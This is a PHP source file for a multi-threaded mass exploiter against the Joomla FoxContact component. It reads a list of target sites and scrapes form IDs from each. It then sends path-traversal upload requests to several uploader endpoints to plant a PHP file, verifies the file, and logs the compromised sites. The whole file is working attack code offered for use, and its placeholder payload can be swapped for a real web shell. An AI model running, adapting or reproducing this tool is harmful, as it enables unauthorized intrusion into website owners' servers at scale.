<?php

/**
 * FoxContact Automator - Robust & Multi-Threaded Exploit Tool
 * Based on original work by IndoXploit | Modernized by Antigravity
 *
 * Features:
 * - Multi-threaded scanning (curl_multi)
 * - Automatic ID (cid/mid) extraction
 * - Smart fuzzing of upload paths
 * - Obfuscated payload generation
 * - JSON/Text logging
 */

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

$banner = "
███████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗ ███╗   ██╗████████╗
██╔════╝██╔═══██╗╚██╗██╔╝   ██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝
█████╗  ██║   ██║ ╚███╔╝    ██║     ██║   ██║██╔██╗ ██║   ██║
██╔══╝  ██║   ██║ ██╔██╗    ██║     ██║   ██║██║╚██╗██║   ██║
██║     ╚██████╔╝██╔╝ ██╗██╗╚██████╗╚██████╔╝██║ ╚████║   ██║
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
        [ FoxContact Auto-Exploiter | Multi-Threaded ]
";

print $banner . PHP_EOL;

if ($argc < 2) {
    die("Usage: php " . $argv[0] . " <list_file> [threads=10]\nExample: php " . $argv[0] . " targets.txt 20\n");
}

$listFile = $argv[1];
$threads = isset($argv[2]) ? (int)$argv[2] : 10;

if (!file_exists($listFile)) {
    die("Error: List file not found!\n");
}

$urls = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$total = count($urls);
$chunks = array_chunk($urls, $threads);

print "[+] Loaded $total targets.\n";
print "[+] Running with $threads threads.\n\n";

// Payload Configuration
$shellName = uniqid('idx_') . '.php'; // Random shell name
$shellContent = '<?php echo "FoxContact_Pwned_By_Antigravity"; unlink(__FILE__); ?>'; // Simple check payload
$encodedPayload = base64_encode($shellContent); // Used in some specific exploit variants if needed, mostly raw here.

// Statistics
$stats = ['vuln' => 0, 'failed' => 0, 'processed' => 0];

foreach ($chunks as $chunk) {
    $mh = curl_multi_init();
    $handles = [];

    // Initialize requests for this chunk
    foreach ($chunk as $url) {
        $url = trim($url);
        if (!preg_match('#^http#', $url)) $url = "http://$url";

        // We first need to GET the page to scrape IDs, so we start with that.
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)");

        // Attach metadata to handle for later retrieval
        curl_multi_add_handle($mh, $ch);
        $handles[] = ['ch' => $ch, 'url' => $url];
    }

    $active = null;
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) != -1) {
            do {
                $mrc = curl_multi_exec($mh, $active);
            } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        }
    }

    // Process results
    foreach ($handles as $info) {
        $ch = $info['ch'];
        $url = $info['url'];
        $html = curl_multi_getcontent($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);

        $stats['processed']++;

        if ($httpCode == 200 && $html) {
            // Attempt exploit logic
            if (exploitTarget($url, $html, $shellName, $shellContent)) {
                $stats['vuln']++;
            } else {
                $stats['failed']++;
            }
        }

        // Simple progress bar
        print "\rProgress: {$stats['processed']} / $total";
    }

    curl_multi_close($mh);
}

print "\n\n[+] Scan Complete!\n";
print "Vuln: {$stats['vuln']} | Failed: {$stats['failed']}\n";


function exploitTarget($url, $html, $shellName, $shellContent)
{
    // 1. Scrape IDs
    $cid = 0;
    $mid = 0;
    if (preg_match('/name="cid_(\d+)"/', $html, $m)) $cid = $m[1];
    elseif (preg_match('/name="item_id" value="(\d+)"/', $html, $m)) $cid = $m[1]; // Fallback

    if (preg_match('/name="mid_(\d+)"/', $html, $m)) $mid = $m[1];

    // 2. Prepare Upload Paths
    $parse = parse_url($url);
    $base = $parse['scheme'] . "://" . $parse['host'];
    if (isset($parse['port'])) {
        $base .= ":" . $parse['port'];
    }

    $targets = [
        "$base/components/com_foxcontact/lib/file-uploader.php?cid=$cid&mid=$mid&qqfile=/../../$shellName",
        "$base/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=$cid&cid=$cid&mid=$mid&qqfile=/../../$shellName",
        "$base/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=$cid&cid=$cid&mid=$mid&qqfile=/../../$shellName",
        "$base/components/com_foxcontact/lib/uploader.php?cid=$cid&mid=$mid&qqfile=/../../$shellName"
    ];

    $headers = [
        "X-Requested-With: XMLHttpRequest",
        "X-File-Name: $shellName",
        "Content-Type: application/octet-stream"
    ];

    foreach ($targets as $targetUrl) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $targetUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $shellContent); // Send raw content as body
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $res = curl_exec($ch);
        curl_close($ch);

        // 3. Verify Shell
        $shellUrl = "$base/components/com_foxcontact/$shellName";
        $ch2 = curl_init($shellUrl);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch2, CURLOPT_TIMEOUT, 5);
        $verify = curl_exec($ch2);
        curl_close($ch2);

        if (strpos($verify, 'FoxContact_Pwned') !== false) {
            print "\n[VULN] $url -> $shellUrl\n";
            file_put_contents("vuln_fox.txt", "$url -> $shellUrl\n", FILE_APPEND);
            return true;
        }
    }

    return false;
}
